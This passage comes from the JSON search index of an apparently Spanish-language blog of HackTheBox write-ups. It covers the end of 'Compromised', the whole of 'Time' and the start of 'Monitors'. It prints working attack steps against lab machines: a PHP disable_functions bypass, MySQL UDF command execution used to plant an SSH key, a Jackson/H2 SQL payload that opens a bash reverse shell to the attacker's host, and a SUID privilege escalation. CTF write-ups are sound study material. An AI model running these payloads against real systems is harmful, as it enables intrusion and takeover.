uno estatico de nombre shell. php y ejecutaremos dentro del arhivo phpinfo() para ver las funciones que estan desabilitadas.  Volvemos a ejecutar nuevamente el exploit. ❯ python2 litecart. py -t http://10. 10. 10. 207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'Shell =&gt; http://10. 10. 10. 207/shop/admin/. . /vqmod/xml/shell. phpVamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función system.  Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar. PHP-7. 3-disable_functions-Bypass Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo funct. php. Dentro lo que hace el codigo es crear una función con el nombre pwn, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con $_REQUEST['cmd], para que atravez de cmd pueda ejecutar instrucciones.  Ahora modificaremos el exploit litercart, para que nos suba el contenido de la nueva función creada funct. php Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.  Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.  Para simular una tty utilizaremos la herramienta tty_over_http de s4vitar.  https://github. com/s4vitar/ttyoverhttpEl uso es simple solo debemos ingresar la url de nuestra shell en la solicitud requests De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola. ❯ python3 tty_over_http. py&gt; whoami&gt; www-datals&gt; D5B8I. phpfmiracle. phpindex. htmlshell. phppython3 -c 'import pty;pty. spawn( /bin/bash )'&gt; www-data@compromised:/var/www/html/shop$ls&gt; lsadmin data favicon. ico includes  logs  robots. txtcache ext  images	 index. php pages vqmodRecordemos que anteriormente obtuvimos credenciales de la base de datos root:changethis Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash. www-data@compromised:/var/www/html/shop$ mysql -uroot -pchangethis -e  select username, password from lc_users;  ecom&lt; -e  select username, password from lc_users;  ecommysql: [Warning] Using a password on the command line interface can be insecure. +----------+------------------------------------------------------------------+| username | password                             |+----------+------------------------------------------------------------------+| admin  | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |+----------+------------------------------------------------------------------+www-data@compromised:/var/www/html/shop$Al seguir enumerando el sistema, vemos que existe un usuario mysql, el cual tiene asignada una bash. &gt; cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinsysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bashmysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bashred:x:1001:1001::/home/red:/bin/falseComo el usuario mysql tiene una bash podria estar relacionado a los UDF, que nos permiten definir funciones especificas.  UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat(). Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando: mysql -uroot -pchangethis -e  select * from mysql. func &lt;l -uroot -pchangethis -e  select * from mysql. func mysql: [Warning] Using a password on the command line interface can be insecure. +----------+-----+-------------+----------+| name   | ret | dl     | type   |+----------+-----+-------------+----------+| exec_cmd |  0 | libmysql. so | function |+----------+-----+-------------+----------+vemos que existe una función definida de nombre exec_cmd, que al ejecutar un comando nos lo realiza exitosamente. mysql -uroot -pchangethis -e  select exec_cmd('pwd'); &lt;ql -uroot -pchangethis -e  select exec_cmd('pwd'); mysql: [Warning] Using a password on the command line interface can be insecure| exec_cmd('pwd')                                                                                                                                                   |+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| /var/lib/mysqlNo podemos entablarnos una reverse shell, pero recordemos que el puerto 22 esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como authorized_keys Creamos el directorio . ssh mysql -uroot -pchangethis -e  select exec_cmd('mkdir /var/lib/mysql/. ssh/'); &lt;-e  select exec_cmd('mkdir /var/lib/mysql/. ssh/'); mysql: [Warning] Using a password on the command line interface can be insecure| exec_cmd('mkdir /var/lib/mysql/. ssh/')                 Introducimos nuestra clave privada, renombrandola como authorized_keys mysql -uroot -pchangethis -e  select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &gt; /var/lib/mysql/. ssh/authorized_keys'); &lt;ot@hack4u &gt; /var/lib/mysql/. ssh/authorized_keys'); mysql: [Warning] Using a password on the command line interface can be insecure. ❯ ssh mysql@10. 10. 10. 207Last login: Thu Sep 3 11:52:44 2020 from 10. 10. 14. 2mysql@compromised:~$ whoamimysqlUna vez dentro como el usuario mysql, vamos a buscar de manera recursiva por la palabra sysadmin, encontramos un archivo lib/mysql/strace-log. dat. mysql@compromised:/var$ grep -ri  sysadmin  2&gt;/dev/nulllog/cloud-init. log:2020-05-08 15:50:07,874 - __init__. py[DEBUG]: Adding user sysadminlog/cloud-init. log:2020-05-08 15:50:07,874 - util. py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']log/cloud-init. log:2020-05-08 15:50:31,366 - cc_ssh_import_id. py[DEBUG]: User sysadmin is not configured for ssh_import_idlog/cloud-init-output. log:ci-info: no authorized SSH keys fingerprints found for user sysadmin. log/installer/subiquity-debug. log. 2150:2020-05-08 15:33:28,872 DEBUG subiquity. controllers. identity:73 IdentityController. done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&lt;REDACTED&gt;'}lib/dpkg/info/systemd. postinst:# runtime-dir/sysadmin-dir/other packages (e. g. rsyslog)lib/dpkg/info/dash. postinst:		# The sysadmin wants it this way.  Who am I to argue?lib/dpkg/info/libssl1. 0. 0:amd64. postinst:	# update for a security issue, but planned by the sysadmin, notlib/dpkg/info/libssl1. 1:amd64. postinst:	# update for a security issue, but planned by the sysadmin, notlib/dpkg/info/irqbalance. postinst:  # things the local sysadmin has added to the old /etc/default/irqbalancelib/dpkg/info/irqbalance. postinst:    # Insert a header to help sysadmin figure out why these things are here. lib/dpkg/info/irqbalance. postinst:    # been added to the file by the local sysadmin. lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited rootlib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking thelib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadminslib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited rootlib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking thelib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadminslib/mysql/strace-log. dat:22102 03:10:59 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 84lib/mysql/strace-log. dat:22102 03:11:00 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 84lib/mysql/strace-log. dat:22102 03:11:03 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 84lib/mysql/strace-log. dat:22227 03:11:09 stat( /home/sysadmin/. my. cnf , 0x7fff97cc5590) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22227 03:11:09 stat( /home/sysadmin/. mylogin. cnf , 0x7fff97cc5590) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22102 03:11:09 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 84lib/mysql/strace-log. dat:22228 03:11:15 stat( /home/sysadmin/. my. cnf , 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22228 03:11:15 stat( /home/sysadmin/. mylogin. cnf , 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22102 03:11:15 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 84lib/mysql/strace-log. dat:22229 03:11:18 stat( /home/sysadmin/. my. cnf , 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22229 03:11:18 stat( /home/sysadmin/. mylogin. cnf , 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)lib/mysql/strace-log. dat:22229 03:11:18 readlink( /home/sysadmin/. mysql_history , 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)Leemos el archivo y filtramos por sysadmin y password, para tratar de encontrar credenciales en texto claro. mysql@compromised:/var$ cat lib/mysql/strace-log. dat | grep -iE  sysadmin|password 22102 03:10:59 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 8422102 03:11:00 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 8422102 03:11:03 write(2,  \33]0;sysadmin@compromised: /opt\7\33 . . . , 84) = 8422102 03:11:06 write(2,  mysql -u root --password='3*NLJE . . . , 39) = 3922227 03:11:09 execve( /usr/bin/mysql , [ mysql ,  -u ,  root ,  --password=3*NLJE32I$Fe ], 0x55bc62467900 /* 21 vars */) = 0Encontramos una credencial que si la validamos corresponde al usuario sysadmin, ahora podemos ir a su directorio personal y visualizar la primera flag user. txt mysql@compromised:/var$ su sysadminPassword: sysadmin@compromised:/var$ whoamisysadminsysadmin@compromised:/var$ cd /home/sysadmin/sysadmin@compromised:~$ cat user. txt e0915cc0811946d4d341100789b6592eEscalada de Privilegios #: Como la maquina se llama compromised, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un rootkit.  Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos. Para poder detectarlo vamos a usar linpeas. sh del repositorio de carlospolop.  https://github. com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7Ejecutamos el linpeas y encontramos que . pam_unix. so se encuentra oculto.   pam_unix. so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado. Como vemos el pam_unix toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo. sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 . pam_unix. so; echoUna vez tengamos el archivo en nuestro equipo vamos a examinarlo con radare2 ❯ file pam_unix. sopam_unix. so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped❯ radare2 pam_unix. soWarning: run r2 with -e bin. cache=true to fix relocations in disassembly -- Select your architecture with: 'e asm. arch=&lt;arch&gt;' or r2 -a from the shell[0x000025c0]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze all functions arguments/locals[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Integrate dwarf function information. [x] Use -AA or aaaa to perform additional experimental analysis. [0x000025c0]&gt; afl0x000025c0  4 50  -&gt; 40  entry00x00002c70  28 732 -&gt; 681 dbg. pam_sm_acct_mgmt0x00002f70  34 670 -&gt; 633 dbg. pam_sm_authenticate0x00004390  13 222 -&gt; 210 dbg. pam_sm_close_session0x00003210  6 116     dbg. pam_sm_setcred0x00003750 104 2863 -&gt; 2805 dbg. pam_sm_chauthtok0x00004280  13 262 -&gt; 256 dbg. pam_sm_open_session[0x000025c0]&gt; s dbg. pam_sm_authenticate[0x00002f70]&gt; pdfAnalizando vemos una intrucción que hace referencia a pam_unix_auth. c, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos zlke~U3Env82m2-.  Validamos y efectivamente la credencial corresponde al usuario root. sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su rootPassword: root@compromised:/lib/x86_64-linux-gnu/security# whoamirootLo que nos queda por hacer es dirigirnos al directorio personal del usuario root y visualizar la segunda flag root. txt. root@compromised:/lib/x86_64-linux-gnu/security# cd /root/root@compromised:~# cat root. txt e62293eadbdb5c168b024782d6943394"
    }, {
    "id": 33,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Time",
    "title": "Maquina Time - htb writeup",
    "body": "2023/06/12 - Hoy vamos a resolver la máquina Time de la plataforma de hackthebox correspondiente a una linux dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de Jackson CVE-2019-12384, y aprovecharemos la vulnerabilidad SSRF derivandola en una ejecucion remota de comandos RCE que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea Cron podamos obtener acceso como el usuario root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Time❯ ls TimeSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 214PING 10. 10. 10. 214 (10. 10. 10. 214) 56(84) bytes of data. 64 bytes from 10. 10. 10. 214: icmp_seq=1 ttl=63 time=133 ms--- 10. 10. 10. 214 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 133. 374/133. 374/133. 374/0. 000 msVemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 214 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-12 20:48 GMTInitiating SYN Stealth Scan at 20:48Scanning 10. 10. 10. 214 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 214Discovered open port 22/tcp on 10. 10. 10. 214Completed SYN Stealth Scan at 20:49, 17. 83s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 214Host is up, received user-set (0. 15s latency). Scanned at 2023-06-12 20:48:51 GMT for 18sNot shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 17. 97 seconds      Raw packets sent: 87623 (3. 855MB) | Rcvd: 86271 (3. 451MB)Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80 10. 10. 10. 214 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-12 20:49 GMTNmap scan report for 10. 10. 10. 214Host is up (0. 21s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)|  256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)|_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)80/tcp open http  Apache httpd 2. 4. 41 ((Ubuntu))|_http-title: Online JSON parser|_http-server-header: Apache/2. 4. 41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20. 90 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       80   HTTP   Apache httpd 2. 4. 41   Seguidamente vamos a usar la herramienta whatweb para ver por consola el gestor de contenido de la pagina web. ❯ whatweb http://10. 10. 10. 214http://10. 10. 10. 214 [200 OK] Apache[2. 4. 41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 41 (Ubuntu)], IP[10. 10. 10. 214], JQuery[3. 2. 1], Script, Title[Online JSON parser]La herramienta nos reporta que se trata de un JSON parser Explotación #: Vamos a abrir la web y vemos que la pagina efectivamente es un JSON parser Vemos una opcion de Beautify que al pasarle datos en JSON nos lo muestra de manera mas estetica.  Dentro de las opciones tambien podemos ver una de Validate (Beta),y si procesamos una comilla nos arroja un error referente a jackson java Investigando un poco encontramos que existe una vulnerabilidad a una libreria jackson que se usa para la deserealizacion JSON y mediante ello podemos realizar ataques de SSRF y derivarlo a una ejecucion remota de comandos. Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:  jackson-gadgetsPara explotar esta vulnerabilidad debemos crear un archivo inject. sql con el siguiente contenido: CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java. io. IOException {	String[] command = { bash ,  -c , cmd};	java. util. Scanner s = new java. util. Scanner(Runtime. getRuntime(). exec(command). getInputStream()). useDelimiter( \\A );	return s. hasNext() ? s. next() :   ; }$$;CALL SHELLEXEC('bash -i &gt;&amp; /dev/tcp/10. 10. 16. 3/443 0&gt;&amp;1')En la función shellexec, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en bash que nos permita obtener una reverse shell. Lo siguiente ejecutar lo siguiente instrucción en el JSON PARSER, donde especificaremos nuestra ip, donde nos compartiremos el archivo inject. sql Ahora nos compartimos el archivo, usando python. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el 443 y enviamos la instrucción. Recibimos la petición ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 214 - - [12/Jun/2023 23:13:26]  GET /inject. sql HTTP/1. 1  200 -y obnenemos acceso como el usuario pericles ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 214. Ncat: Connection from 10. 10. 10. 214:38128. bash: cannot set terminal process group (857): Inappropriate ioctl for devicebash: no job control in this shellpericles@time:/var/www/html$ whoamiwhoamipericlespericles@time:/var/www/html$Como siempre vamos a configurar nuestra tty full interactiva pericles@time:/var/www/html$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullpericles@time:/var/www/html$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermpericles@time:/var/www/html$ export TERM=xtermpericles@time:/var/www/html$ export SHELL=bash pericles@time:/var/www/html$ stty rows 45 columns 184Nos dirigimos al directorio personal del usuario pericles y visializamos la primera flag user. txt pericles@time:/var/www/html$ cd /homepericles@time:/home$ lspericlespericles@time:/home$ cd pericles/pericles@time:/home/pericles$ lssnap user. txtpericles@time:/home/pericles$ cat user. txt 5598d4c823ca1aadd34004c1ed4cbfc8pericles@time:/home/pericles$ Escalada de Privilegios #: Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando systenctl list-timers. pericles@time:/home/pericles$ systemctl list-timersNEXT            LEFT     LAST            PASSED        UNIT             ACTIVATES           Mon 2023-06-12 23:21:41 UTC 3s left    Mon 2023-06-12 23:21:31 UTC 6s ago        timer_backup. timer      timer_backup. service     Mon 2023-06-12 23:39:00 UTC 17min left  Mon 2023-06-12 23:09:00 UTC 12min ago      phpsessionclean. timer    phpsessionclean. service    Tue 2023-06-13 00:00:00 UTC 38min left  Mon 2023-06-12 20:41:25 UTC 2h 40min ago     logrotate. timer       logrotate. service       Tue 2023-06-13 00:00:00 UTC 38min left  Mon 2023-06-12 20:41:25 UTC 2h 40min ago     man-db. timer         man-db. service        Tue 2023-06-13 00:09:59 UTC 48min left  Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news. timer       motd-news. service       Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily. timer       apt-daily. service       Tue 2023-06-13 06:16:25 UTC 6h left    Mon 2023-06-12 21:40:37 UTC 1h 41min ago     apt-daily-upgrade. timer   apt-daily-upgrade. service   Tue 2023-06-13 14:30:45 UTC 15h left   Mon 2023-06-12 22:46:51 UTC 34min ago      fwupd-refresh. timer     fwupd-refresh. service     Tue 2023-06-13 20:56:20 UTC 21h left   Mon 2023-06-12 20:56:20 UTC 2h 25min ago     systemd-tmpfiles-clean. timer systemd-tmpfiles-clean. serviceSun 2023-06-18 03:10:37 UTC 5 days left  Mon 2023-06-12 20:42:05 UTC 2h 39min ago     e2scrub_all. timer      e2scrub_all. service      Mon 2023-06-19 00:00:00 UTC 6 days left  Mon 2023-06-12 20:41:25 UTC 2h 40min ago     fstrim. timer         fstrim. service        Obervamos que se esta ejecutando un timer_backup, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre procmon. sh #!/bin/bashold_process=$(ps -eo user,command)while true; do new_process=$(ps -eo user,command) diff &lt;(echo  $old_process ) &lt;(echo  $new_process ) | grep  [\&gt;\&lt;]  | grep -vE  procmon|command|kworker   old_process=$new_processdoneLo ejecutamos en la maquina victima y vemos que el usuario root esta ejecutando el arhivo timer_backup. sh a intervalos regulares de tiempo. root   /bin/sh -e /usr/lib/php/sessioncleanroot   /bin/sh -e /usr/lib/php/sessioncleanroot   /lib/systemd/systemd-udevdroot   /lib/systemd/systemd-udevdroot   /lib/systemd/systemd-udevdroot   /bin/bash /usr/bin/timer_backup. shroot   zip -r website. bak. zip /var/www/htmlroot   /bin/bash /usr/bin/timer_backup. shroot   zip -r website. bak. zip /var/www/htmlViendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura. pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup. sh-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup. shpericles@time:/home/pericles$Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio suid a la bash. pericles@time:/home/pericles$ cat /usr/bin/timer_backup. sh#!/bin/bashchmod u+s /bin/bashYa que el usuario root nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la bash. pericles@time:/home/pericles$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Feb 25 2020 /bin/bashLo unico que nos queda por hacer seria ejecutar bash -p y nos convertiriamos en el usuario root, ahora vamos a su directorio personal y visualizamos la segunda flag root. txt. pericles@time:/home/pericles$ bash -pbash-5. 0# whoamirootbash-5. 0# cd /rootbash-5. 0# cat root. txta527d7fbd3e113aeb96d956af2900de8"
    }, {
    "id": 34,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Monitors",
    "title": "Maquina Monitors - htb writeup",
    "body": "2023/05/14 - El dia de hoy vamos a estar resolviendo la maquina Monitors de hackthebox que es una maquina Linux de dificultad Dificil. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin spritz de Wordpress que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de cacti con una version vulnerable, seguidamente abusaremos de un ataque de deserealizacion con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability sysmodule para escapar del contenedor y ganar acceso a la maquina real como el usuario root. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Monitors❯ ls Monitors❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  exploits  nmapEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 238PING 10. 10. 10. 238 (10. 10. 10. 238) 56(84) bytes of data. 64 bytes from 10. 10. 10. 238: icmp_seq=1 ttl=63 time=108 ms--- 10. 10. 10. 238 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 108. 365/108. 365/108. 365/0. 000 msVemos que la maquina nos responde con un ttl de 63 correspondiente a una maquina linux, ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 238 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-05-14 21:04 GMTInitiating SYN Stealth Scan at 21:04Scanning 10. 10. 10. 238 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 238Discovered open port 80/tcp on 10. 10. 10. 238Completed SYN Stealth Scan at 21:04, 28. 62s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 238Host is up, received user-set (2. 6s latency). Scanned at 2023-05-14 21:04:30 GMT for 29sNot shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 28. 72 seconds      Raw packets sent: 110162 (4. 847MB) | Rcvd: 86054 (3. 442MB)Podemos ver puertos interesantes que se encuentran abiertos como 22 ssh y 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80 10. 10. 10. 238 -oN targetedStarting Nmap 